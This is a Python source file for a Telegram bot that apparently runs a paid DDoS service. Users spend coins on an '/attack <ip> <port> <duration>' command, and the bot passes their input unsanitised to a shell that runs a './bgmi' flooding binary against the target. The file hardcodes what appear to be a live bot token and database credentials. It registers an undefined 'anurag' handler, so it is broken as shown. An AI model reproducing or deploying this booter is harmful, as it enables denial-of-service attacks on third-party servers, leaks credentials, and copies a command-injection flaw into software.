import asyncio
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from motor.motor_asyncio import AsyncIOMotorClient

TELEGRAM_BOT_TOKEN = '7711360792:AAE9G4vqiak1URRYY9gBUj1_xdchTxU7usk'
ADMIN_USER_ID = 7017469802
MONGO_URI = "mongodb+srv://Kamisama:Kamisama@kamisama.m6kon.mongodb.net/"
DB_NAME = "dake"
COLLECTION_NAME = "users"
attack_in_progress = False
ATTACK_TIME_LIMIT = 300  # Maximum attack duration in seconds
COINS_REQUIRED_PER_ATTACK = 5  # Coins required for an attack

# MongoDB setup
mongo_client = AsyncIOMotorClient(MONGO_URI)
db = mongo_client[DB_NAME]
users_collection = db[COLLECTION_NAME]

async def get_user(user_id):
    """Fetch user data from MongoDB."""
    user = await users_collection.find_one({"user_id": user_id})
    if not user:
        return {"user_id": user_id, "coins": 0}
    return user

async def update_user(user_id, coins):
    """Update user coins in MongoDB."""
    await users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"coins": coins}},
        upsert=True
    )

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Oye Chutiye! Welcome to @seedhe_maut DDOS Bot! 🔥*\n\n"
        "*Use /help Kyu Ki Tumko Toh Kuch Aata Nahi😂*\n"
        "*Aur haan, hacker banne ka sapna dekhna band kar aur ab drama shuru kar! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def daku(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Chal nikal! Tera aukaat nahi hai yeh command chalane ki. Admin se baat kar pehle.*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Tere ko simple command bhi nahi aati? Chal, sikh le: /daku <add|rem> <user_id> <coins>*", parse_mode='Markdown')
        return

    command, target_user_id, coins = args
    coins = int(coins)
    target_user_id = int(target_user_id)

    user = await get_user(target_user_id)

    if command == 'add':
        new_balance = user["coins"] + coins
        await update_user(target_user_id, new_balance)
        await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {target_user_id} ko {coins} coins diye gaye. Balance: {new_balance}.*", parse_mode='Markdown')
    elif command == 'rem':
        new_balance = max(0, user["coins"] - coins)
        await update_user(target_user_id, new_balance)
        await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {target_user_id} ke {coins} coins kaat diye. Balance: {new_balance}.*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    args = context.args

    user = await get_user(user_id)

    if user["coins"] < COINS_REQUIRED_PER_ATTACK:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Chal bhai, tere paas toh coins ka chillar bhi nahi hai. Admin ke saamne haath jod!* 😂", parse_mode='Markdown')
        return

    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Arre bhai, chill kar! Ek aur attack already chal raha hai. Itna desperate mat ban.*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage ka itna simple command bhi nahi samajh aaya? Try this: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args
    duration = int(duration)

    if duration > ATTACK_TIME_LIMIT:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Bhai, tumhare sapne bade hain, par limit {ATTACK_TIME_LIMIT} seconds ki hai. Zyada hawa mein mat ud!*", parse_mode='Markdown')
        return

    # Deduct coins
    new_balance = user["coins"] - COINS_REQUIRED_PER_ATTACK
    await update_user(user_id, new_balance)

    await context.bot.send_message(chat_id=chat_id, text=(
        f"*⚔️ ATTACK START KIYA HAI, FAKE HACKER! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Deducted: {COINS_REQUIRED_PER_ATTACK} coins*\n"
        f"*💰 Baaki ka balance: {new_balance}*\n"
        f"*Ab Chill Maar Aur Apne Sapno Mein DDOS Kar! 😂*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

async def run_attack(chat_id, ip, port, duration, context):
    global attack_in_progress
    attack_in_progress = True

    try:
        command = f"./bgmi {ip} {port} {duration} {512} 800"
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error aaya, hacker sahab! Lagta hai system tere se zyada smart hai. Error: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack khatam ho gaya! Chal ab ja, ghar pe roti kha aur zindagi jeene ki koshish kar.*", parse_mode='Markdown')

async def myinfo(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    user = await get_user(user_id)

    balance = user["coins"]
    message = (
        f"*📝 Tera info check kar le, chutiye hacker:*\n"
        f"*💰 Coins: {balance}*\n"
        f"*😏 Status: Approved*\n"
        f"*Ab aur kya chahiye? Hacker banne ka sapna toh kabhi poora hoga nahi!*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def help(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🛠️ Yeh lo, help menu:*\n"
        "*🔧 /attack <ip> <port> <duration>* - Attack karne ka fake natak.\n"
        "*🧾 /myinfo* - Apna balance aur status check kar, Beta!\n"
        "*Chal, ab yeh commands use karke hacker banne ka drama kar!*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("anurag", anurag))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("myinfo", myinfo))
    application.add_handler(CommandHandler("help", help))
    application.run_polling()

if __name__ == '__main__':
    main()
